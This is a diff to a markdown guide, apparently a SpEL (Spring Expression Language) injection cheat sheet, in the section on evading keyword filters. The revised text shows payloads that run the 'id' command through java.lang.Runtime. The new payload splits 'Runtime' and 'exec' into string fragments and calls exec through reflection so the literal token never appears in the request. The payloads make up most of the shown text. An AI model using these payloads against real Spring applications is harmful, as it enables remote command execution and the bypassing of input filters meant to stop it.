@@ -25,10 +25,10 @@ T(java.lang.Runtime).getRuntime().exec('i'+'d')
 ''.class.forName('java.lang.Run'+'time').getMethod('getRun'+'time').invoke(null).exec('id')
 ```
 
-Because method names reach through `getMethod(String)`, the `exec` token is built the same way, removing it from the request:
+A direct `.exec('id')` call cannot split its token, but calling `exec` reflectively can: pass the name to `getMethod`, built from fragments, and `invoke` it, so the literal `exec` never appears:
 
 ```
-''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null)[T(java.lang.Runtime).getDeclaredMethods()[?(#this.name=='exec')][0].name]('id')
+''.class.forName('java.lang.Run'+'time').getMethod('getRun'+'time').invoke(null).getClass().getMethod('ex'+'ec',T(java.lang.String)).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')
 ```
 
 ## Building strings from characters
